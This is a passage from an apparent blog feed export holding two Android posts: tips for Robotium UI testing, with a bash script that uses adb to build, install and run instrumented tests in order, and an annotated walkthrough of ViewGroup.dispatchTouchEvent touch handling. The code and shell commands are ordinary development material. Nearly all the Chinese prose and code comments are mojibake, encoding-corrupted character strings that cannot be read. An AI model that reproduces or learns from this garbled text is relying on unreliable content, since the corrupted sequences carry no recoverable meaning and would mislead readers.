ä¸ºå„ä¸ªRecyclerViewåŠ è½½çš„é¡ºåºæ˜¯ç›¸å¯¹å›ºå®šçš„ï¼Œæ‰€ä»¥æ¯æ¬¡è¿è¡Œæ‹¿åˆ°çš„RecyclerViewæ˜¯åŒä¸€ä¸ªã€‚æ‹¿ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œå¦‚æžœè¦æ‹¿åˆ°ç¬¬äºŒä¸ªtabä¸­çš„RecyclerViewï¼Œè¦èŽ·å–çš„åº”è¯¥æ˜¯ç¬¬2ä¸ªã€‚ å…ˆèŽ·å–å®ƒçš„ä»»æ„ä¸€ä¸ªParentViewï¼Œç„¶åŽé€šè¿‡getCurrentViews(ç±»åï¼ŒViewGroup)æ–¹æ³•æ‹¿åˆ°Listï¼Œå¦‚æžœViewGroupæ˜¯å”¯ä¸€çš„ï¼Œè¿™ä¸ªListä¸­åº”è¯¥åªä¼šæœ‰æˆ‘ä»¬æƒ³è¦çš„é‚£ä¸ªï¼Œä¹Ÿå¯ä»¥ç”¨ViewGroupæ¥ç¼©å°æˆ‘ä»¬æœç´¢çš„èŒƒå›´ã€‚ViewèŽ·å–çš„æŠ€å·§æ€»ç»“ä¸€ä¸‹ å®šä½Viewæœ€ä¸ºæ–¹ä¾¿çš„å°±æ˜¯ä½¿ç”¨getView(int id/ç±»å)è¿™ä¸ªæ–¹å¼ï¼Œå¦‚æžœid/ç±»åçš„å®žä¾‹å”¯ä¸€ï¼Œå°±å¯ä»¥ç›´æŽ¥æ‹¿åˆ°ã€‚ å¦‚æžœåŒid/ç±»åæœ‰å¾ˆå¤šä¸ªviewå­˜åœ¨ï¼Œè¦ä½¿ç”¨getView(int id/ç±»å, int index)ï¼Œæ‹¿åˆ°ç¬¬nä¸ªviewå®žä¾‹ã€‚ å¦‚æžœè¯¥viewæ‰€å¤„çš„ä»»ä¸€ä¸ªViewGroupå¾ˆå¥½èŽ·å–ï¼ˆæœ‰å”¯ä¸€id/ç±»åï¼‰ï¼Œå¯ä»¥é€šè¿‡getCurrentViews(ç±»å, ViewGroup)è¿™ä¸ªæ–¹å¼è¿…é€Ÿç¼©å°èŒƒå›´ï¼Œæ‹¿åˆ°æƒ³è¦çš„Viewã€‚RecyclerViewä¸­èŽ·å–ViewHolderRobotiumå…è®¸æˆ‘ä»¬ç›´æŽ¥æ‹¿åˆ°Viewå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æŽ¥ä½¿ç”¨RecyclerViewçš„findViewHolderForAdapterPosition()æ–¹æ³•åŽ»æ‹¿ViewHolderï¼Œä½†æ˜¯äº‹æƒ…å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæˆ‘ä»¬çŸ¥é“RecyclerViewçš„ç‰¹ç‚¹æ˜¯æ²¡æœ‰åœ¨å±å¹•ä¸Šæ˜¾ç¤ºçš„ViewHolderæ˜¯æ²¡æœ‰è¢«å®žä¾‹åŒ–çš„ï¼Œè¿™æ ·æ‹¿åˆ°çš„ä¼šæ˜¯nullï¼Œæ‰€ä»¥ä¸ºäº†æ‹¿åˆ°æ‰€æœ‰ViewHolderæˆ‘ä»¬è¿˜éœ€è¦ä½¿ç”¨scrollDownRecyclerView()æ–¹æ³•è®©RecyclerViewæ»šåŠ¨èµ·æ¥ï¼Œä½†æ˜¯ä½¿ç”¨è¿™ä¸ªæ–¹æ³•è¿˜ä¼šæœ‰é—®é¢˜ï¼Œæœ‰æ—¶å€™å®ƒä¼šå¤±æ•ˆï¼ˆæ€€ç–‘æ˜¯æ²¡æœ‰å®Œæˆæ»šåŠ¨å°±æ‰§è¡Œäº†ä¸‹ä¸€æ¡è¯­å¥ï¼‰ï¼Œæ‰€ä»¥è¿˜éœ€è¦åœ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä¹‹åŽè®¾ä¸€ä¸ªå»¶è¿Ÿï¼ˆ100mså°±è¡Œï¼‰ï¼Œæ ·ä¾‹ä»£ç å¦‚ä¸‹ï¼š1234567891011for (int i = 0; i &lt; listAdapter.getItemCount(); i++) &#123; RecyclerView.ViewHolder viewHolder = recyclerView.findViewHolderForAdapterPosition(i); if (null == viewHolder) &#123; mSolo.scrollDownRecyclerView(0); SystemClock.sleep(100); viewHolder = recyclerView.findViewHolderForAdapterPosition(i); &#125; if (testAction.test(listAdapter, viewHolder, i)) &#123; break; &#125;&#125; WebViewä¸­çš„WebElementèŽ·å–éœ€è¦å»¶è¿Ÿä¹‹å‰ä»‹ç»äº†ç­‰å¾…WebViewåŠ è½½çš„æ–¹æ³•ï¼Œä½†æ˜¯å®žé™…ä¸Šè¿™ä¸ªæ–¹æ³•è¿”å›žåŽé€šè¿‡getWebElements()æ‹¿åˆ°çš„WebElementsæ˜¯ç©ºçš„ï¼Œå®žé™…ä¸Šæƒ³è¦æ‹¿åˆ°WebElementè¿˜è¦ç­‰å¾…å‡ ç§’ç§çš„æ—¶é—´ã€‚ è¾“å…¥å­—ç¬¦çš„é—®é¢˜ç›´æŽ¥è¾“å…¥å­—ç¬¦çš„æ–¹æ³•123private void inputString(String text) &#123; InstrumentationRegistry.getInstrumentation().sendStringSync(text);&#125; ä¼šæŠŠstringæ‹†åˆ†æˆæŒ‰é”®åºåˆ—è¾“å…¥ã€‚ ä¸¢å¤±å­—ç¬¦çš„é—®é¢˜è°ƒç”¨ä¸Šé¢çš„æ–¹æ³•è¾“å…¥çš„å­—ç¬¦è¿‡é•¿çš„æ—¶å€™ä¼šå¶å‘å‡ºçŽ°å­—ç¬¦ä¸¢å¤±çš„é—®é¢˜ï¼Œæš‚æ—¶ä¸çŸ¥é“è§£å†³æ–¹æ³•ï¼Œåªèƒ½è¾“å…¥çŸ­ä¸€ç‚¹çš„å­—ç¬¦ã€‚ æ–¹æ³•è°ƒç”¨é¡ºåºçš„é—®é¢˜å†™åœ¨AndroidTestæ–‡ä»¶å¤¹ä¸‹åŒä¸€ä¸ªæµ‹è¯•ç±»ä¸­çš„å„ä¸ªæ–¹æ³•çš„è°ƒç”¨é¡ºåºæ˜¯æœªçŸ¥çš„ï¼Œè€Œä¸”æ²¡æœ‰æ‰¾åˆ°å¥½çš„åŠžæ³•å¯ä»¥ç›´æŽ¥åœ¨å†…éƒ¨å†³å®šå®ƒä»¬çš„è°ƒç”¨é¡ºåºï¼Œæœ¬æ¥è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå¤§é—®é¢˜ï¼Œä½†æ˜¯åœ¨å†™æµ‹è¯•çš„è¿‡ç¨‹ä¸­å‡ºçŽ°äº†ä¸€ä¸ªæ¯”è¾ƒè‡´å‘½çš„é—®é¢˜ï¼šè¿žç»­æ‰“å¼€WebViewä¼šå¯¼è‡´WebViewæ— æ³•åŠ è½½ã€‚è¿™ä¸ªé—®é¢˜åº”è¯¥æ˜¯ç”±äºŽå¤ç”¨äº†WebViewæˆ–è€…loading viewçš„åˆ¤æ–­å‡ºäº†é—®é¢˜å¯¼è‡´çš„ã€‚å•ç‹¬å•æ¬¡åœ°è¿è¡Œå•ä¸ªæµ‹è¯•æ–¹æ³•å¹¶ä¸ä¼šå‡ºçŽ°è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥è€ƒè™‘è½¬è€Œä½¿ç”¨æ‰‹å†™æµ‹è¯•è„šæœ¬ çš„æ–¹å¼æ¥å†³å®šæ–¹æ³•çš„è°ƒç”¨é¡ºåºå¹¶ä¸”å•æ¬¡åœ°è¿è¡Œå•ä¸ªæµ‹è¯•æ–¹æ³•ã€‚åŒæ—¶è„šæœ¬è¿˜åº”è¯¥æ”¯æŒé‡æ–°ç¼–è¯‘æµ‹è¯•Apkå¹¶ä¸”å®‰è£…åˆ°æ‰‹æœºï¼Œå¹¶ä¸”å¯ä»¥æŒ‡å®šæµ‹è¯•çš„æ–¹æ³•ä¸Žæ‰§è¡Œé¡ºåºã€‚æœ€ç»ˆç¼–å†™å®Œæˆçš„è„šæœ¬å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526#!/bin/bashfunction rebuild_install() &#123; ./gradlew --build-cache :app:assemblePublishxxxDebug :app:assemblePublishxxxDebugAndroidTest adb push app/build/outputs/apk/publishxxx/debug/app-publish-xxx-debug.apk /data/local/tmp/com.xxx.xx.xxxx adb shell pm install -t -r "/data/local/tmp/com.xxx.xx.xxxx" adb push app/build/outputs/apk/androidTest/publishxxx/debug/app-publish-xxx-debug-androidTest.apk /data/local/tmp/com.xxx.xx.xxxx adb shell pm install -t -r "/data/local/tmp/com.xxx.xx.xxxx"&#125;cd ..if [ -n "$1" ] &amp;&amp; [ "$1" = rebuild ]then rebuild_installelse echo Not Rebuildfitest_funcs=($(awk '&#123;print $0&#125;' ui_test/funtion_names.txt))for funcs in $&#123;test_funcs[@]&#125;do echo â”Œ-------------------------------------- echo Start $funcs adb shell am force-stop com.xxx.xx.xxxx adb shell am instrument -w -r -e debug false -e class com.xxx.xx.xxxx.MainInstrumentedTest#$funcs com.xxx.xx.xxxx.test/android.support.test.runner.AndroidJUnitRunner | sed -En -e '/There was/,/FAILURES/p;/OK/p' echo â””--------------------------------------done éœ€è¦æµ‹è¯•çš„æ–¹æ³•æŒ‰é¡ºåºæ”¾åœ¨funtion_names.txtæ–‡ä»¶ä¸­ï¼š1234checkLogoutcheckNewDoccheckCreateDoccheckOpenShare åœ¨ä½¿ç”¨æ—¶å¯ä»¥ä¼ å…¥rebuildå‚æ•°æ¥é‡æ–°æž„å»ºå¹¶å®‰è£…ï¼Œæœªä¼ å…¥å¯ä»¥ç›´æŽ¥å¼€å§‹æµ‹è¯•ï¼š12./test.sh rebuild // é‡æ–°æž„å»ºå¹¶å®‰è£…./test.sh //ç›´æŽ¥æµ‹è¯• è¿è¡Œç»“æžœç¤ºä¾‹ï¼š1234567891011121314151617Not Rebuildâ”Œ--------------------------------------Start checkLogoutOK (1 test)â””--------------------------------------â”Œ--------------------------------------Start checkNewDocOK (1 test)â””--------------------------------------â”Œ--------------------------------------Start checkCreateDocOK (1 test)â””--------------------------------------â”Œ--------------------------------------Start checkOpenShareOK (1 test)â””--------------------------------------]]></content>
      <categories>
        <category>Android</category>
        <category>Test</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Test</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android è§¦æ‘¸äº‹ä»¶åˆ†å‘æœºåˆ¶ï¼ˆä¸‰ï¼‰Viewè§¦æ‘¸äº‹ä»¶åˆ†å‘æœºåˆ¶]]></title>
    <url>%2F2017%2F11%2F02%2Fandroid_view_event_3%2F</url>
    <content type="text"><![CDATA[Viewè§¦æ‘¸äº‹ä»¶åˆ†å‘ç»è¿‡å‰é¢çš„ä¸¤ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬ç»ˆäºŽä»Žå†…æ ¸ï¼ˆè§¦æ‘¸äº‹ä»¶çš„çœŸæ­£æ¥æºï¼‰ä¸€è·¯ç»è¿‡Nativeå±‚é€šè¿‡æ¶ˆæ¯æœºåˆ¶æ¥åˆ°äº†éœ€è¦æŽ¥æ”¶çš„åº”ç”¨çš„ä¸»çº¿ç¨‹æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç„¶åŽè¢«å¤„ç†ï¼Œé¦–å…ˆè°ƒç”¨çš„æ˜¯åº”ç”¨æ ¹Viewï¼ˆDecorView)çš„dispatchPointerEvent()æ–¹æ³•ï¼ˆç»§æ‰¿è‡ªViewï¼‰ï¼š 1234567public final boolean dispatchPointerEvent(MotionEvent event) &#123; if (event.isTouchEvent()) &#123; return dispatchTouchEvent(event); &#125; else &#123; return dispatchGenericMotionEvent(event); &#125;&#125; è°ƒç”¨äº†ViewGroupçš„dispatchTouchEvent()æ–¹æ³•ï¼ˆDecorViewç»§æ‰¿è‡ªFrameLayoutï¼‰ï¼š dispatchTouchEvent(ViewGroup)é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯ViewGroupçš„è§¦æ‘¸äº‹ä»¶åˆ†å‘æ–¹æ³•ï¼Œå®ƒé‡å†™äº†çˆ¶ç±»Viewçš„è¯¥æ–¹æ³•ï¼ŒViewä¹Ÿæœ‰è‡ªå·±çš„dispatchTouchEvent()æ–¹æ³•ï¼ˆåŽé¢å†è®²ï¼‰ã€‚ è¿™ä¸ªæ–¹æ³•éžå¸¸é•¿ï¼Œæˆ‘ä»¬æ‹†å¼€æ¥åˆ†æžï¼Œé¦–å…ˆæˆ‘ä»¬è¦æ˜Žç¡®ä¸€ç‚¹ï¼Œç”±äºŽAndroidåœ¨ç³»ç»Ÿçº§åˆ«å¼•å…¥äº†è¾…åŠ©åŠŸèƒ½é€‰é¡¹ï¼ˆAccessibilityFoucsï¼‰æ¥å¸®åŠ©æœ‰éšœç¢çš„ç”¨æˆ·ä½¿ç”¨ç³»ç»Ÿï¼Œæ‰€ä»¥å¦‚æžœä¸€ä¸ªäº‹ä»¶å¸¦æœ‰TargetAccessibilityFocusæ ‡å¿—ï¼Œè¯´æ˜Žè¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¾…åŠ©åŠŸèƒ½äº‹ä»¶ï¼Œéœ€è¦è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼ˆè™½ç„¶è¿™ç§æƒ…å†µæ¯”è¾ƒå°‘è§ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940 @Override public boolean dispatchTouchEvent(MotionEvent ev) &#123; // å¦‚æžœæ˜¯è¾…åŠ©åŠŸèƒ½äº‹ä»¶ï¼Œå¹¶ä¸”å½“å‰viewæ˜¯ç›®æ ‡viewï¼Œé‚£ä¹ˆå–æ¶ˆæ ‡å¿—ï¼Œè¿›è¡Œæ™®é€šåˆ†å‘if (ev.isTargetAccessibilityFocus() &amp;&amp; isAccessibilityFocusedViewOrHost()) &#123; ev.setTargetAccessibilityFocus(false); &#125; boolean handled = false;// å®‰å…¨åŽŸå› æ£€æŸ¥è§¦æ‘¸äº‹ä»¶ if (onFilterTouchEventForSecurity(ev)) &#123; final int action = ev.getAction(); final int actionMasked = action &amp; MotionEvent.ACTION_MASK; // å¦‚æžœäº‹ä»¶ç±»åž‹æ˜¯æŒ‰ä¸‹ï¼Œæ¸…é™¤ä¹‹å‰çš„å¤„ç†ï¼Œé‡æ–°å¼€å§‹å¤„ç†è§¦æ‘¸åŠ¨ä½œ if (actionMasked == MotionEvent.ACTION_DOWN) &#123; cancelAndClearTouchTargets(ev); resetTouchState(); &#125; // æ‹¦æˆªæ ‡å¿—ï¼ˆé‡è¦ï¼‰ final boolean intercepted; // å¦‚æžœæ˜¯æŒ‰ä¸‹äº‹ä»¶ï¼ˆæ–°çš„è§¦æ‘¸åŠ¨ä½œï¼‰ï¼Œæˆ–è€…å·²ç»å­˜åœ¨å¤„ç†äº‹ä»¶çš„å­View if (actionMasked == MotionEvent.ACTION_DOWN || mFirstTouchTarget != null) &#123; // æ£€æŸ¥æ˜¯å¦ä¸å…è®¸æ‹¦æˆªäº‹ä»¶ï¼ˆrequestDisallowInterceptTouchEvent(true)è¢«è°ƒç”¨çš„æƒ…å†µï¼‰ final boolean disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != 0; if (!disallowIntercept) &#123; // è°ƒç”¨onInterceptTouchEventæ–¹æ³•ç¡®å®šæ˜¯å¦æ‹¦æˆªäº‹ä»¶ï¼ˆåŽé¢è®²ï¼‰ intercepted = onInterceptTouchEvent(ev); ev.setAction(action); // æ¢å¤actionçŠ¶æ€ä»¥é¿å…å…¶åœ¨ä¸Šä¸€è¡Œä¸­è¢«æ”¹å˜ &#125; else &#123; // ä¸æ‹¦æˆªï¼ˆä¸å…è®¸ï¼‰ intercepted = false; &#125; &#125; else &#123; // å¦‚æžœä¸æ˜¯ä¸€ä¸ªæ–°è§¦æ‘¸åŠ¨ä½œçš„å¼€å§‹ï¼ˆä¸æ˜¯downï¼‰ï¼Œå¹¶ä¸”æ²¡æœ‰å¤„ç†è¯¥æ¶ˆæ¯çš„ç›®æ ‡ï¼ˆmFirstTouchTargetä¸ºnullï¼‰ï¼Œè¯´æ˜Žå½“å‰viewåº”è¯¥è´Ÿè´£å¤„ç†è¯¥äº‹ä»¶ï¼Œåˆ™å½“å‰viewåº”è¯¥ç»§ç»­æ‹¦æˆªå¹¶å¤„ç†è¿™ä¸ªäº‹ä»¶ intercepted = true; &#125; // å¦‚æžœè¢«å½“å‰viewæ‹¦æˆªï¼Œæˆ–è€…å·²ç»æœ‰å¤„ç†è¯¥äº‹ä»¶çš„ç›®æ ‡ï¼Œåˆ™åŽ»é™¤è¾…åŠ©åŠŸèƒ½æ ‡å¿—ï¼Œè¿›è¡Œæ™®é€šçš„äº‹ä»¶åˆ†å‘ if (intercepted || mFirstTouchTarget != null) &#123; ev.setTargetAccessibilityFocus(false); &#125; è¿™ä¸€æ®µå°±æ˜¯æ£€æµ‹è¯¥viewæ˜¯å¦åº”è¯¥è¢«æ‹¦æˆªï¼Œè™½ç„¶æ²¡æœ‰çœ‹ä¸‹é¢çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹å¦‚æžœinterceptedæ ‡å¿—ä¸ºtrueï¼Œé‚£ä¹ˆè¿™ä¸ªäº‹ä»¶å°±ä¼šç•™åœ¨è¯¥viewè¢«å¤„ç†è€Œä¸ä¼šå†å‘å…¶å­viewåˆ†å‘ã€‚ä¸‹é¢æ˜¯ViewGroupé»˜è®¤çš„å¤„ç†æ–¹å¼ï¼š onInterceptTouchEvent()123456789public boolean onInterceptTouchEvent(MotionEvent ev) &#123; if (ev.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp; ev.getAction() == MotionEvent.ACTION_DOWN &amp;&amp; ev.isButtonPressed(MotionEvent.BUTTON_PRIMARY) &amp;&amp; isOnScrollbarThumb(ev.getX(), ev.getY())) &#123; return true; &#125; return false;&#125; è¿™ä¸ªæ–¹æ³•é»˜è®¤åªæ˜¯å¯¹ä¸€ä¸ªç‰¹æ®Šæƒ…å†µä½œäº†ç‰¹æ®Šçš„æ‹¦æˆªå¤„ç†ã€‚ dispatchTouchEvent(ViewGroup)ç»§ç»­å‘ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435// æ£€æŸ¥æ˜¯å¦ä¸ºå–æ¶ˆäº‹ä»¶final boolean canceled = resetCancelNextUpFlag(this) || actionMasked == MotionEvent.ACTION_CANCEL;// åˆ†ç¦»è§¦æ‘¸äº‹ä»¶æ ‡å¿—ï¼Œå¦‚æžœæ˜¯å¤šç‚¹è§¦æ‘¸ï¼Œåˆ†åˆ«åˆ†å‘ç»™å¤šä¸ªview final boolean split = (mGroupFlags &amp; FLAG_SPLIT_MOTION_EVENTS) != 0; TouchTarget newTouchTarget = null; boolean alreadyDispatchedToNewTouchTarget = false;// å¦‚æžœæœªè¢«å–æ¶ˆå¹¶ä¸”æ²¡æœ‰è¢«å½“å‰viewæ‹¦æˆªï¼Œåº”è¯¥è¿›è¡Œå‘ä¸‹åˆ†å‘ if (!canceled &amp;&amp; !intercepted) &#123; // å¦‚æžœæ˜¯è¾…åŠ©åŠŸèƒ½äº‹ä»¶ï¼Œæˆ‘ä»¬è°ƒç”¨findChildWithAccessibilityFocus()æ¥æ‰¾åˆ°æŽ¥æ”¶è¯¥äº‹ä»¶çš„ç›®æ ‡view View childWithAccessibilityFocus = ev.isTargetAccessibilityFocus() ? findChildWithAccessibilityFocus() : null; // å¦‚æžœæ˜¯ä¸€ä¸ªæŒ‰ä¸‹äº‹ä»¶ï¼ˆåˆå§‹äº‹ä»¶ï¼‰ if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; final int actionIndex = ev.getActionIndex(); // æŒ‰ä¸‹äº‹ä»¶ä¸º0 // èŽ·å–è§¦æ‘¸ç‚¹å¯¹åº”çš„PointerIdï¼Œä¸€ä¸ªidè¡¨ç¤ºä¸€ä¸ªè§¦æ‘¸ç‚¹ï¼Œå¦‚æžœä¸åˆ†ç¦»ï¼Œåˆ™èŽ·å–å…¨éƒ¨çš„id final int idBitsToAssign = split ? 1 &lt;&lt; ev.getPointerId(actionIndex) : TouchTarget.ALL_POINTER_IDS; // æ¸…é™¤ä¹‹å‰çš„idä¿¡æ¯ removePointersFromTouchTargets(idBitsToAssign); final int childrenCount = mChildrenCount; if (newTouchTarget == null &amp;&amp; childrenCount != 0) &#123; final float x = ev.getX(actionIndex); final float y = ev.getY(actionIndex); // åˆ›å»ºå¾…éåŽ†çš„viewåˆ—è¡¨ï¼Œè°ƒç”¨äº†buildTouchDispatchChildList()æ–¹æ³•ï¼ˆè§ä¸‹æ–‡ï¼‰ final ArrayList&lt;View&gt; preorderedList = buildTouchDispatchChildList(); // æ˜¯å¦é‡‡ç”¨è‡ªå®šä¹‰viewé¡ºåºï¼ˆè¿™ä¸ªé¡ºåºå°†å†³å®šå“ªä¸ªviewä¼šå…ˆæŽ¥æ”¶åˆ°äº‹ä»¶ï¼‰ final boolean customOrder = preorderedList == null &amp;&amp; isChildrenDrawingOrderEnabled(); final View[] children = mChildren; è¿™æ®µä¸»è¦ä¸ºåŽé¢çš„æŸ¥æ‰¾ç›®æ ‡viewä½œå‡†å¤‡ï¼Œæˆ‘ä»¬å…ˆå»ºç«‹äº†preorderedListåˆ—è¡¨ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªåˆ—è¡¨çš„é¡ºåºæ˜¯å¦‚ä½•æž„å»ºçš„ï¼š æž„å»ºå¾…éåŽ†çš„viewæ•°ç»„123public ArrayList&lt;View&gt; buildTouchDispatchChildList() &#123; return buildOrderedChildList();&#125; 1234567891011121314151617181920212223242526272829ArrayList&lt;View&gt; buildOrderedChildList() &#123; final int childrenCount = mChildrenCount; // å¦‚æžœå­viewæ•°å°äºŽç­‰äºŽ1ï¼Œæˆ–æ²¡æœ‰å­viewæœ‰zè½´ï¼Œç›´æŽ¥è¿”å›žnull if (childrenCount &lt;= 1 || !hasChildWithZ()) return null; if (mPreSortedChildren == null) &#123; mPreSortedChildren = new ArrayList&lt;&gt;(childrenCount); &#125; else &#123; mPreSortedChildren.clear(); mPreSortedChildren.ensureCapacity(childrenCount); &#125; // å¦‚æžœè‡ªå®šä¹‰ç»˜åˆ¶é¡ºåºï¼Œåˆ™åº”ä½¿ç”¨è‡ªå®šä¹‰åˆ†å‘é¡ºåº final boolean customOrder = isChildrenDrawingOrderEnabled(); for (int i = 0; i &lt; childrenCount; i++) &#123; // èŽ·å–æ­£ç¡®çš„å­viewç´¢å¼•ï¼ˆä¸ä¸ºè‡ªå®šä¹‰é¡ºåºæ—¶ä¸ºiï¼Œè‡ªå®šä¹‰é¡ºåºæ—¶ä¸ºè‡ªå®šä¹‰é¡ºåºå¯¹åº”çš„ç´¢å¼• final int childIndex = getAndVerifyPreorderedIndex(childrenCount, i, customOrder); final View nextChild = mChildren[childIndex]; // ä¿å­˜zå€¼ final float currentZ = nextChild.getZ(); // å¦‚æžœåˆ—è¡¨ä¸­æœ€åŽä¸€ä¸ªviewçš„zå€¼å¤§äºŽå¾…æ’å…¥çš„viewï¼Œå°†å½“å‰viewæ’å…¥å…¶ä¹‹å‰ï¼Œä¿è¯åœ¨åŽé¢ä»ŽåŽå‘å‰éåŽ†viewæ—¶å¯ä»¥ä¿å­˜åœ¨å±å¹•æœ€ä¸Šé¢çš„viewå¯ä»¥å…ˆæŽ¥æ”¶åˆ°è§¦æ‘¸äº‹ä»¶ int insertIndex = i; while (insertIndex &gt; 0 &amp;&amp; mPreSortedChildren.get(insertIndex - 1).getZ() &gt; currentZ) &#123; insertIndex--; &#125; mPreSortedChildren.add(insertIndex, nextChild); &#125; return mPreSortedChildren;&#125; æ€»çš„æ¥è¯´ï¼Œå°±æ˜¯å¦‚æžœæœ‰è‡ªå®šä¹‰ç»˜åˆ¶é¡ºåºï¼Œé‚£ä¹ˆæŒ‰è‡ªå®šä¹‰ç»˜åˆ¶é¡ºåºï¼Œå¦åˆ™æŒ‰é»˜è®¤ç»˜åˆ¶é¡ºåºï¼Œç„¶åŽå¦‚æžœviewå®šä¹‰äº†zå€¼å±žæ€§ï¼Œé‚£ä¹ˆåœ¨å±å¹•æœ€ä¸Šå±‚çš„viewåº”è¯¥å…ˆæŽ¥æ”¶åˆ°è§¦æ‘¸äº‹ä»¶ã€‚ dispatchTouchEvent(ViewGroup)å›žåˆ°åˆ†å‘æ–¹æ³•ï¼Œç»§ç»­å‘ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859 for (int i = childrenCount - 1; i &gt;= 0; i--) &#123; // ä»ŽpreorderListä¸­èŽ·å–åˆ°æ­£ç¡®çš„ç´¢å¼•ä¸Žå­view final int childIndex = getAndVerifyPreorderedIndex( childrenCount, i, customOrder); final View child = getAndVerifyPreorderedView( preorderedList, children, childIndex); // å¦‚æžœéœ€è¦å¤„ç†è¾…åŠ©åŠŸèƒ½äº‹ä»¶ï¼ˆæ‰¾åˆ°äº†ç›®æ ‡å­viewï¼‰ if (childWithAccessibilityFocus != null) &#123; // ä¿è¯è¯¥å­viewæœ€å…ˆæŽ¥æ”¶åˆ°äº‹ä»¶ if (childWithAccessibilityFocus != child) &#123; continue; &#125; // æ‰¾åˆ°è¯¥å­viewåŽæ¸…é™¤ç›®æ ‡çš„è®°å½• childWithAccessibilityFocus = null; // å¦‚æžœè¯¥å­viewæ²¡æœ‰å¤„ç†è¾…åŠ©åŠŸèƒ½äº‹ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥é‡æ–°éåŽ†viewè¿›è¡Œæ™®é€šåˆ†å‘ï¼Œæ•…å°†ié‡ç½® i = childrenCount - 1; &#125; // ä¸¤ä¸ªæ–¹æ³•åˆ†åˆ«æ£€æŸ¥å­viewæ˜¯å¦èƒ½æŽ¥æ”¶è§¦æ‘¸äº‹ä»¶ ä¸Ž è§¦æ‘¸äº‹ä»¶åœ¨è¯¥viewçš„èŒƒå›´å†…ï¼Œå¦‚æžœéƒ½æˆç«‹ï¼Œè¯´æ˜Žæ‰¾åˆ°äº†åº”è¯¥å¤„ç†è¯¥äº‹ä»¶çš„å­view if (!canViewReceivePointerEvents(child) || !isTransformedTouchPointInView(x, y, child, null)) &#123; ev.setTargetAccessibilityFocus(false); continue; &#125; // æ‰¾åˆ°äº†ç›®æ ‡å­viewï¼Œæ£€æŸ¥touchTargeté“¾è¡¨ä¸­æ˜¯å¦å·²ç»å­˜åœ¨è¿™ä¸ªview newTouchTarget = getTouchTarget(child); if (newTouchTarget != null) &#123; // é“¾è¡¨ä¸­å·²ç»å­˜åœ¨è¯¥viewï¼Œè¯´æ˜Žè¯¥å­viewå·²ç»æŽ¥æ”¶è¿‡æŒ‰ä¸‹ï¼ˆåˆå§‹ï¼‰çš„è§¦æ‘¸äº‹ä»¶ï¼Œè¯´æ˜Žè¿™æ˜¯ä¸€ä¸ªå¤šç‚¹è§¦æ‘¸çš„æƒ…å†µï¼ŒæŠŠæ–°çš„ç‚¹åŠ å…¥touchTargetå¹¶é€€å‡ºå­viewéåŽ† newTouchTarget.pointerIdBits |= idBitsToAssign; break; &#125; resetCancelNextUpFlag(child); // åœ¨dispatchTransformedTouchEvent()æ–¹æ³•ä¸­è¿›è¡Œä¸‹ä¸€å±‚çš„äº‹ä»¶åˆ†å‘ï¼Œå¦‚æžœè¯¥æ–¹æ³•è¿”å›žtrueï¼Œè¯´æ˜Žäº‹ä»¶è¢«åŽç»­çš„viewå¤„ç†äº† if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) &#123; // ä¿å­˜mLastTouchDownTimeã€mLastTouchDownIndexã€mLastTouchDownXã€mLastTouchDownY mLastTouchDownTime = ev.getDownTime(); if (preorderedList != null) &#123; for (int j = 0; j &lt; childrenCount; j++) &#123; if (children[childIndex] == mChildren[j]) &#123; mLastTouchDownIndex = j; break; &#125; &#125; &#125; else &#123; mLastTouchDownIndex = childIndex; &#125; mLastTouchDownX = ev.getX(); mLastTouchDownY = ev.getY(); // ä¿å­˜è¯¥viewåˆ°touchTargeté“¾è¡¨ newTouchTarget = addTouchTarget(child, idBitsToAssign);alreadyDispatchedToNewTouchTarget = true; break; // é€€å‡ºå¯¹å­viewçš„éåŽ†ï¼Œä¸€ä¸ªäº‹ä»¶åªä¼šè¢«åˆ†å‘ç»™ä¸€ä¸ªå­view &#125; ev.setTargetAccessibilityFocus(false); &#125; // è¿™é‡Œæ˜¯éåŽ†viewå¾ªçŽ¯ç»“æŸç‚¹ // æ¸…é™¤preorderedListï¼Œé¿å…viewæ³„éœ² if (preorderedList != null) preorderedList.clear(); &#125; // è¿™é‡Œif (newTouchTarget == null &amp;&amp; childrenCount != 0) åˆ¤æ–­ç»“æŸç‚¹ é¦–å…ˆæ˜Žç¡®ä¸€ç‚¹ï¼Œè¿™æ®µä»£ç æ•´ä¸ªéƒ½æ˜¯åœ¨ 123if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; è¿™ä¸ªæ¡ä»¶ä¸‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªdownäº‹ä»¶ï¼Œæ ‡å¿—ç€ä¸€ä¸ªæ–°è§¦æ‘¸åŠ¨ä½œçš„å¼€å§‹ï¼ˆä¸€ä¸ªè§¦æ‘¸åŠ¨ä½œä¸€èˆ¬æ˜¯down-&gt;move-&gt;upè¿™æ 